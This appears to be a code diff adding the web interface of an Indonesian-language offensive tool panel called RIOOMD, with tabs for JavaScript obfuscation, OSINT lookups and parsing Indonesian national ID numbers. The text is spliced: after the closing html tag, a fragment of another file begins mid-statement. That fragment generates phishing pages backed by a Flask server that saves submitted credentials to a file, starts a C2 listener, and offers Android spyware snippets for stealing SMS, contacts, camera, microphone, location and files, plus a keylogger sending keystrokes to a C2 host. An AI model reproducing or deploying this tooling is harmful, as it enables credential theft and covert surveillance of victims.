@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RIOOMD</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:linear-gradient(135deg,#1a0a0f,#2d0f18,#1a0a0f);min-height:100vh;color:#f0d0d8;font-family:Arial;padding:20px;display:flex;justify-content:center;align-items:center}
+.container{max-width:600px;width:100%}
+.logo{text-align:center;margin-bottom:24px}
+.logo h1{font-size:28px;color:#ff4d6d;letter-spacing:2px;text-shadow:0 0 20px #ff4d6d80}
+.logo p{font-size:11px;color:#8a5060;letter-spacing:3px;margin-top:6px}
+.card{background:rgba(45,15,24,.6);border:1px solid rgba(255,77,109,.3);border-radius:16px;padding:24px;backdrop-filter:blur(10px);box-shadow:0 8px 32px rgba(255,77,109,.15)}
+.card h2{font-size:14px;color:#ff4d6d;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px}
+label{display:block;font-size:11px;color:#a06070;text-transform:uppercase;letter-spacing:1px;margin-top:14px;margin-bottom:6px;font-weight:600}
+input,select,textarea{width:100%;padding:12px;background:rgba(26,10,15,.7);border:1px solid rgba(255,77,109,.3);border-radius:8px;color:#f0d0d8;font-size:13px;outline:none;font-family:monospace}
+input:focus,textarea:focus{border-color:#ff4d6d;box-shadow:0 0 10px #ff4d6d40}
+textarea{resize:vertical;min-height:100px}
+button{width:100%;padding:12px;background:linear-gradient(135deg,#ff4d6d,#c9184a);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px;margin-top:16px;transition:transform .1s}
+button:active{transform:scale(.98)}
+.tabs{display:flex;gap:6px;margin-bottom:16px;overflow-x:auto}
+.tab{flex:1;padding:8px;background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.3);border-radius:8px;color:#a06070;font-size:11px;font-weight:600;cursor:pointer;text-align:center;text-transform:uppercase;white-space:nowrap}
+.tab.active{background:#ff4d6d;color:#fff;border-color:#ff4d6d}
+.panel{display:none}
+.panel.active{display:block}
+pre{background:rgba(10,3,6,.8);border:1px solid rgba(255,77,109,.2);border-radius:8px;padding:12px;font-family:monospace;font-size:11px;color:#ff8fa3;line-height:1.5;white-space:pre-wrap;word-break:break-word;margin-top:12px;max-height:300px;overflow-y:auto}
+.hidden{display:none}
+.user-bar{text-align:center;font-size:11px;color:#a06070;margin-bottom:16px}
+.user-bar span{color:#ff4d6d;font-weight:600}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <h1>🔱 RIOOMD</h1>
+    <p>PANEL TOOLS · MAROON GLASS</p>
+  </div>
+
+  <div class="card" id="loginCard">
+    <h2>Login</h2>
+    <label>Username</label>
+    <input type="text" id="loginUser" placeholder="username">
+    <label>Password</label>
+    <input type="password" id="loginPass" placeholder="password">
+    <button onclick="doLogin()">Masuk</button>
+    <p style="font-size:11px;color:#a06070;text-align:center;margin-top:14px">Belum punya akun? Buat di bot Telegram: <code>/createuser</code></p>
+  </div>
+
+  <div class="card hidden" id="panelCard">
+    <div class="user-bar">Login sebagai: <span id="userName">-</span></div>
+
+    <div class="tabs">
+      <div class="tab active" data-p="obf">OBF</div>
+      <div class="tab" data-p="osint">OSINT</div>
+      <div class="tab" data-p="nik">NIK</div>
+      <div class="tab" data-p="vps">VPS</div>
+    </div>
+
+    <div class="panel active" id="panel-obf">
+      <h2>Obfuscate JavaScript</h2>
+      <label>Kode JS</label>
+      <textarea id="obfCode" placeholder="console.log('hello')"></textarea>
+      <button onclick="runObf()">Obfuscate</button>
+      <pre id="obfOut"></pre>
+    </div>
+
+    <div class="panel" id="panel-osint">
+      <h2>OSINT Lookup</h2>
+      <label>IP / Domain</label>
+      <input type="text" id="osintTarget" placeholder="1.1.1.1">
+      <button onclick="runOsint()">Lookup</button>
+      <pre id="osintOut"></pre>
+    </div>
+
+    <div class="panel" id="panel-nik">
+      <h2>NIK Parse</h2>
+      <label>NIK (16 digit)</label>
+      <input type="text" id="nikInput" placeholder="3201234567890001">
+      <button onclick="runNik()">Parse</button>
+      <pre id="nikOut"></pre>
+    </div>
+
+    <div class="panel" id="panel-vps">
+      <h2>VPS Check</h2>
+      <label>IP VPS</label>
+      <input type="text" id="vpsIp" placeholder="1.1.1.1">
+      <button onclick="runVps()">Check</button>
+      <pre id="vpsOut"></pre>
+    </div>
+  </div>
+</div>
+
+<script>
+var TOKEN = '';
+
+function doLogin() {
+  var u = document.getElementById('loginUser').value;
+  var p = document.getElementById('loginPass').value;
+  fetch('/api/login', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({username: u, password: p})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (d.ok) {
+      TOKEN = d.token;
+      document.getElementById('loginCard').classList.add('hidden');
+      document.getElementById('panelCard').classList.remove('hidden');
+      document.getElementById('userName').textContent = d.username;
+      localStorage.setItem('rioomd_token', TOKEN);
+      localStorage.setItem('rioomd_user', d.username);
+    } else {
+      alert('Login gagal: ' + d.error);
+    }
+  });
+}
+
+function api(endpoint, data, outId) {
+  fetch(endpoint, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json', 'X-Auth-Token': TOKEN},
+    body: JSON.stringify(data)
+  })
+  .then(r => r.json())
+  .then(d => {
+    document.getElementById(outId).textContent = d.ok ? d.result : 'Error: ' + d.error;
+  })
+  .catch(e => {
+    document.getElementById(outId).textContent = 'Error: ' + e.message;
+  });
+}
+
+function runObf() { api('/api/obf', {code: document.getElementById('obfCode').value}, 'obfOut'); }
+function runOsint() { api('/api/osint', {target: document.getElementById('osintTarget').value}, 'osintOut'); }
+function runNik() { api('/api/nik', {nik: document.getElementById('nikInput').value}, 'nikOut'); }
+function runVps() { api('/api/vps', {ip: document.getElementById('vpsIp').value}, 'vpsOut'); }
+
+document.querySelectorAll('.tab').forEach(function(tab) {
+  tab.onclick = function() {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById('panel-' + this.dataset.p).classList.add('active');
+  };
+});
+
+var saved = localStorage.getItem('rioomd_token');
+if (saved) {
+  TOKEN = saved;
+  document.getElementById('loginCard').classList.add('hidden');
+  document.getElementById('panelCard').classList.remove('hidden');
+  document.getElementById('userName').textContent = localStorage.getItem('rioomd_user') || 'user';
+}
+</script>
+</body>
+  </html>sizing:border-box}';
+  html += 'button{width:100%;padding:14px;background:' + t.color + ';color:#fff;border:none;border-radius:8px;font-size:16px}</style>';
+  html += '</head><body><div class="box"><h1>' + t.name + '</h1><h2>' + title + '</h2>';
+  html += '<form method="POST" action="/submit">' + fieldsHtml;
+  html += '<button type="submit">Masuk</button></form></div></body></html>';
+
+  var serverCode = 'from flask import Flask, request, redirect\n';
+  serverCode += 'app = Flask(__name__)\n\n';
+  serverCode += '@app.route("/")\n';
+  serverCode += 'def index():\n';
+  serverCode += '    return """' + html.replace(/"/g, '\\"') + '"""\n\n';
+  serverCode += '@app.route("/submit", methods=["POST"])\n';
+  serverCode += 'def submit():\n';
+  serverCode += '    data = dict(request.form)\n';
+  serverCode += '    open("creds.txt","a").write(str(data)+"\\n")\n';
+  serverCode += '    return redirect("' + redirect + '")\n\n';
+  serverCode += 'app.run(host="0.0.0.0", port=' + port + ')';
+
+  document.getElementById('ph-output').textContent = serverCode;
+
+  // Save ke native
+  if (window.Native && window.Native.savePhising) {
+    window.Native.savePhising(JSON.stringify({
+      brand: brand,
+      title: title,
+      redirect: redirect,
+      port: port,
+      html: html,
+      server: serverCode
+    }));
+  }
+}
+
+function startPhisingServer() {
+  var port = document.getElementById('ph-port').value || 8080;
+  if (window.Native && window.Native.startServer) {
+    window.Native.startServer(port);
+    document.getElementById('ph-output').textContent = 'Server jalan di port ' + port + '\nAkses dari browser: http://IP-KAMU:' + port;
+  } else {
+    document.getElementById('ph-output').textContent = 'Native bridge gak tersedia. Server cuma bisa jalan di Java shell.';
+  }
+}
+
+function viewCreds() {
+  if (window.Native && window.Native.readCreds) {
+    var creds = window.Native.readCreds();
+    document.getElementById('ph-output').textContent = creds || 'Belum ada creds masuk';
+  } else {
+    document.getElementById('ph-output').textContent = 'Native bridge gak tersedia.';
+  }
+}
+
+// ============================================
+// C2 SERVER
+// ============================================
+function startC2() {
+  var port = document.getElementById('c2-port').value || 4444;
+  if (window.Native && window.Native.startC2) {
+    window.Native.startC2(port);
+    document.getElementById('c2-output').textContent = 'C2 listen di port ' + port;
+  } else {
+    document.getElementById('c2-output').textContent = 'Native bridge gak tersedia.';
+  }
+}
+
+function stopC2() {
+  if (window.Native && window.Native.stopC2) {
+    window.Native.stopC2();
+    document.getElementById('c2-output').textContent = 'C2 stopped';
+  }
+}
+
+// ============================================
+// PAYLOAD
+// ============================================
+var PAYLOADS = {
+  sms: 'import android.database.Cursor;\nimport android.net.Uri;\n\nCursor c = getContentResolver().query(\n  Uri.parse("content://sms/inbox"),\n  null, null, null, "date DESC");\n\nwhile (c.moveToNext()) {\n  String addr = c.getString(c.getColumnIndexOrThrow("address"));\n  String body = c.getString(c.getColumnIndexOrThrow("body"));\n  // Kirim ke C2\n}',
+  contacts: 'Cursor c = getContentResolver().query(\n  ContactsContract.CommonDataKinds.Phone.CONTENT_URI,\n  null, null, null, null);\n\nwhile (c.moveToNext()) {\n  String name = c.getString(c.getColumnIndexOrThrow(\n    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));\n  String phone = c.getString(c.getColumnIndexOrThrow(\n    ContactsContract.CommonDataKinds.Phone.NUMBER));\n}',
+  camera: 'Camera camera = Camera.open(0);\ncamera.takePicture(null, null, new Camera.PictureCallback() {\n  public void onPictureTaken(byte[] data, Camera camera) {\n    // Encode base64, kirim ke C2\n    String b64 = Base64.encodeToString(data, Base64.DEFAULT);\n  }\n});',
+  mic: 'MediaRecorder recorder = new MediaRecorder();\nrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\nrecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);\nrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);\nrecorder.setOutputFile("/sdcard/rec.3gp");\nrecorder.prepare();\nrecorder.start();',
+  location: 'LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);\nLocation loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);\ndouble lat = loc.getLatitude();\ndouble lng = loc.getLongitude();\n// Kirim lat,lng ke C2',
+  keylog: '// Di JS bridge:\ndocument.onkeypress = function(e) {\n  fetch("https://c2.com/log?k=" + String.fromCharCode(e.which));\n};',
+  file: 'File dir = new File("/sdcard");\nFile[] files = dir.listFiles();\nfor (File f : files) {\n  String name = f.getName();\n  long size = f.length();\n  // Kirim list ke C2\n}'
+};
+
+function showPayload() {
+  var type = document.getElementById('pl-type').value;
+  document.getElementById('pl-output').textContent = PAYLOADS[type] || 'Gak ada payload';
+}
+
+function copyPayload() {
+  var text = document.getElementById('pl-output').textContent;
+  if (window.Native && window.Native.copyToClipboard) {
+    window.Native.copyToClipboard(text);
+    alert('Payload dicopy');
+  } else {
+    alert('Copy manual: ' + text.substring(0, 50) + '...');
+  }
+}
+
+// ============================================
+// TAB SWITCHING
+// ============================================
+var tabs = document.querySelectorAll('.tab');
+for (var i = 0; i < tabs.length; i++) {
+  tabs[i].onclick = function() {
+    for (var j = 0; j < tabs.length; j++) {
+      tabs[j].classList.remove('active');
+      document.getElementById('panel-' + tabs[j].getAttribute('data-panel')).classList.remove('active');
+    }
+    this.classList.add('active');
+    document.getElementById('panel-' + this.getAttribute('data-panel')).classList.add('active');
+  };
+}
+
+// ============================================
+// INIT
+// ============================================
+if (window.Native && window.Native.getDeviceIp) {
+  document.getElementById('c2-ip').value = window.Native.getDeviceIp();
+}
+showPayload();
+</script>
+</body>
+</html>
